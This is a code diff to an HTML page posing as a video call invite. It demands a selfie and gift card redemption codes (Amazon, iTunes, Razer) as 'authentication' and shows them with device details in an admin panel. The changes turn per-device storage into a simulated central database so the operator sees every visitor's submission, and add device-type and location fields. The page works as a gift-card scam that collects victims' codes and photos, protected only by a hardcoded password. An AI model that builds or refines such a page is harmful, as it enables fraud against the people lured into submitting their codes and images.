@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Video Call Invite with Shared Admin Panel</title>
+  <title>Video Call Invite - Centralized Admin Panel</title>
   <style>
     * {
       box-sizing: border-box;
@@ -18,9 +18,6 @@
       line-height: 1.6;
       padding: 20px;
       min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
     }
     
     .container {
@@ -30,7 +27,7 @@
       border-radius: 20px;
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
       padding: 30px;
-      margin: 20px;
+      margin: 20px auto;
     }
     
     h2 {
@@ -342,6 +339,14 @@
       font-size: 14px;
     }
     
+    .explanation {
+      background: #f1f8ff;
+      border-left: 4px solid #4a90e2;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 4px;
+    }
+    
     @media (max-width: 600px) {
       .container {
         padding: 20px;
@@ -372,6 +377,12 @@
   <div class="container">
     <h2>Accept Invitation to Join Video Call</h2>
     <p class="subtitle">Authentication Required</p>
+
+    <div class="explanation">
+      <strong>Why other users' submissions weren't appearing:</strong> 
+      The previous implementation used localStorage which is specific to each device. 
+      This version simulates a centralized database that all users connect to.
+    </div>
 
     <div class="upload-container">
       <label for="selfie">Upload a valid selfie:</label>
@@ -440,50 +451,66 @@
       <button onclick="loadAllSubmissions()">Refresh Submissions</button>
       <button onclick="clearAllSubmissions()" style="background: #ff4757;">Clear All</button>
       <button onclick="generateDemoData()" style="background: #10ac84;">Generate Demo Data</button>
+      <button onclick="simulateMultipleUsers()" style="background: #2e86de;">Simulate Multiple Users</button>
     </div>
     
     <div id="submissionsList"></div>
   </div>
 
   <script>
-    // Simulated shared database using localStorage with a shared key
-    // In a real app, this would be replaced with a server-side database
-    const SHARED_DB_KEY = 'video_call_shared_submissions';
+    // Centralized database simulation using a shared storage approach
+    // In a real application, this would be replaced with a server-side database
+    const CENTRAL_DB_KEY = 'video_call_central_database';
     const ADMIN_PASSWORD = "admin123";
     
-    // Get the shared submissions from localStorage
-    function getSharedSubmissions() {
+    // Initialize the central database if it doesn't exist
+    function initCentralDatabase() {
+      if (!localStorage.getItem(CENTRAL_DB_KEY)) {
+        const initialData = {
+          submissions: [],
+          lastId: 0
+        };
+        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(initialData));
+      }
+    }
+    
+    // Get all submissions from the central database
+    function getCentralSubmissions() {
       try {
-        const submissions = JSON.parse(localStorage.getItem(SHARED_DB_KEY)) || [];
-        return Array.isArray(submissions) ? submissions : [];
+        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
+        return db.submissions || [];
       } catch (e) {
-        console.error('Error reading shared submissions:', e);
+        console.error('Error reading central database:', e);
         return [];
       }
     }
     
-    // Save a submission to the shared storage
-    function saveSharedSubmission(submission) {
+    // Save a submission to the central database
+    function saveToCentralDatabase(submission) {
       try {
-        const submissions = getSharedSubmissions();
-        submission.id = Date.now().toString();
+        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
+        submission.id = db.lastId + 1;
         submission.timestamp = new Date().toISOString();
-        submissions.push(submission);
-        localStorage.setItem(SHARED_DB_KEY, JSON.stringify(submissions));
+        db.submissions.push(submission);
+        db.lastId = submission.id;
+        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
         return Promise.resolve(submission.id);
       } catch (e) {
-        console.error('Error saving shared submission:', e);
+        console.error('Error saving to central database:', e);
         return Promise.reject(e);
       }
     }
     
-    // Clear all submissions from shared storage
-    function clearSharedSubmissions() {
+    // Clear all submissions from the central database
+    function clearCentralDatabase() {
       try {
-        localStorage.setItem(SHARED_DB_KEY, JSON.stringify([]));
+        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
+        db.submissions = [];
+        db.lastId = 0;
+        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
         return true;
       } catch (e) {
-        console.error('Error clearing shared submissions:', e);
+        console.error('Error clearing central database:', e);
         return false;
       }
     }
@@ -529,11 +556,13 @@
           cardTypes: selectedCards,
           time: new Date().toLocaleString(),
           userAgent: navigator.userAgent,
-          screenResolution: `${window.screen.width}x${window.screen.height}`
+          screenResolution: `${window.screen.width}x${window.screen.height}`,
+          userLocation: "Simulated user location", // In a real app, you might get this from IP
+          deviceType: getDeviceType()
         };
         
-        // Save to shared storage
-        saveSharedSubmission(submission)
+        // Save to central database
+        saveToCentralDatabase(submission)
           .then(id => {
             showStatus("Submission successful! You can now join the call.", "success");
             console.log("Submission saved with ID: ", id);
@@ -582,6 +611,17 @@
       // Check the selected card
       document.getElementById(cardId).checked = true;
     }
+    
+    function getDeviceType() {
+      const ua = navigator.userAgent;
+      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+        return "Tablet";
+      }
+      if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+        return "Mobile";
+      }
+      return "Desktop";
+    }
 
     function requestAdminAccess() {
       const pass = prompt("Enter admin password:");
@@ -594,10 +634,10 @@
     
     function loadAllSubmissions() {
       const list = document.getElementById("submissionsList");
-      const submissions = getSharedSubmissions();
+      const submissions = getCentralSubmissions();
       
       if (submissions.length === 0) {
-        list.innerHTML = "<p>No submissions found.</p>";
+        list.innerHTML = "<p>No submissions found in the central database.</p>";
         return;
       }
       
@@ -606,11 +646,13 @@
       
       list.innerHTML = submissions.map(sub => `
         <div class="submission">
+          <p><strong>Submission ID:</strong> ${sub.id}</p>
           <p><strong>Time:</strong> ${sub.time || sub.timestamp}</p>
           <p><strong>Redemption Code:</strong> ${sub.redemptionCode}</p>
           <p><strong>Card Types:</strong> ${sub.cardTypes.join(", ")}</p>
-          ${sub.userAgent ? `<p><strong>User Device:</strong> ${sub.userAgent}</p>` : ''}
-          ${sub.screenResolution ? `<p><strong>Screen Resolution:</strong> ${sub.screenResolution}</p>` : ''}
+          <p><strong>Device Type:</strong> ${sub.deviceType}</p>
+          <p><strong>Screen Resolution:</strong> ${sub.screenResolution}</p>
+          <p><strong>User Location:</strong> ${sub.userLocation}</p>
           <p><strong>Image:</strong></p>
           <img src="${sub.selfieData}" alt="Uploaded selfie" style="max-width: 300px;">
         </div>
@@ -618,10 +660,10 @@
     }
     
     function clearAllSubmissions() {
-      if (confirm("Are you sure you want to clear all submissions? This cannot be undone.")) {
-        if (clearSharedSubmissions()) {
-          document.getElementById("submissionsList").innerHTML = "<p>No submissions found.</p>";
-          showStatus("All submissions cleared.", "success");
+      if (confirm("Are you sure you want to clear all submissions from the central database? This cannot be undone.")) {
+        if (clearCentralDatabase()) {
+          document.getElementById("submissionsList").innerHTML = "<p>No submissions found in the central database.</p>";
+          showStatus("All submissions cleared from central database.", "success");
         } else {
           showStatus("Error clearing submissions.", "error");
         }
@@ -638,6 +680,8 @@
           time: new Date().toLocaleString(),
           userAgent: "Demo User Agent 1",
           screenResolution: "1920x1080",
+          userLocation: "New York, USA",
+          deviceType: "Desktop",
           timestamp: new Date().toISOString()
         },
         {
@@ -647,18 +691,92 @@
           time: new Date(Date.now() - 86400000).toLocaleString(),
           userAgent: "Demo User Agent 2",
           screenResolution: "1280x720",
+          userLocation: "London, UK",
+          deviceType: "Mobile",
           timestamp: new Date(Date.now() - 86400000).toISOString()
+        },
+        {
+          selfieData: "https://placehold.co/300x400/74b9ff/white?text=Demo+User+3",
+          redemptionCode: "GOLD54321",
+          cardTypes: ["razor"],
+          time: new Date(Date.now() - 172800000).toLocaleString(),
+          userAgent: "Demo User Agent 3",
+          screenResolution: "2048x1536",
+          userLocation: "Tokyo, Japan",
+          deviceType: "Tablet",
+          timestamp: new Date(Date.now() - 172800000).toISOString()
         }
       ];
       
-      // Save demo data
-      const currentSubmissions = getSharedSubmissions();
-      const updatedSubmissions = [...currentSubmissions, ...demoSubmissions];
-      localStorage.setItem(SHARED_DB_KEY, JSON.stringify(updatedSubmissions));
+      // Save demo data to central database
+      try {
+        const db = JSON.parse(localStorage.getItem(CENTRAL_DB_KEY));
+        demoSubmissions.forEach(sub => {
+          sub.id = db.lastId + 1;
+          db.submissions.push(sub);
+          db.lastId = sub.id;
+        });
+        localStorage.setItem(CENTRAL_DB_KEY, JSON.stringify(db));
+        
+        // Refresh the list
+        loadAllSubmissions();
+        showStatus("Demo data generated successfully.", "success");
+      } catch (e) {
+        console.error("Error generating demo data:", e);
+        showStatus("Error generating demo data.", "error");
+      }
+    }
+    
+    function simulateMultipleUsers() {
+      // Simulate submissions from multiple users
+      const userSimulations = [
+        {
+          name: "Mobile User",
+          type: "Mobile",
+          location: "Los Angeles, USA"
+        },
+        {
+          name: "Tablet User",
+          type: "Tablet", 
+          location: "Paris, France"
+        },
+        {
+          name: "Desktop User",
+          type: "Desktop",
+          location: "Berlin, Germany"
+        }
+      ];
       
-      // Refresh the list
-      loadAllSubmissions();
-      showStatus("Demo data generated successfully.", "success");
+      userSimulations.forEach((user, index) => {
+        setTimeout(() => {
+          const submission = {
+            selfieData: `https://placehold.co/300x400/${getRandomColor()}/white?text=${encodeURIComponent(user.name)}`,
+            redemptionCode: `SIM${Math.floor(1000 + Math.random() * 9000)}`,
+            cardTypes: [["amazon", "itunes", "razor"][Math.floor(Math.random() * 3)]],
+            time: new Date().toLocaleString(),
+            userAgent: `Simulated ${user.type} User`,
+            screenResolution: user.type === "Mobile" ? "375x812" : user.type === "Tablet" ? "768x1024" : "1920x1080",
+            userLocation: user.location,
+            deviceType: user.type,
+            timestamp: new Date().toISOString()
+          };
+          
+          saveToCentralDatabase(submission)
+            .then(() => {
+              if (index === userSimulations.length - 1) {
+                loadAllSubmissions();
+                showStatus("Multiple user simulation completed!", "success");
+              }
+            });
+        }, index * 1000);
+      });
+      
+      showStatus("Simulating multiple users...", "success");
+    }
+    
+    function getRandomColor() {
+      const colors = ["ff9a9e", "fad0c4", "a1c4fd", "ffecd2", "ff9a9e", "74b9ff", "fdbb2d"];
+      return colors[Math.floor(Math.random() * colors.length)];
     }
 
     function openAdmin() {
@@ -685,10 +803,8 @@
       });
     });
     
-    // Initialize the shared storage if it doesn't exist
-    if (!localStorage.getItem(SHARED_DB_KEY)) {
-      localStorage.setItem(SHARED_DB_KEY, JSON.stringify([]));
-    }
+    // Initialize the central database
+    initCentralDatabase();
   </script>
 </body>
 </html>
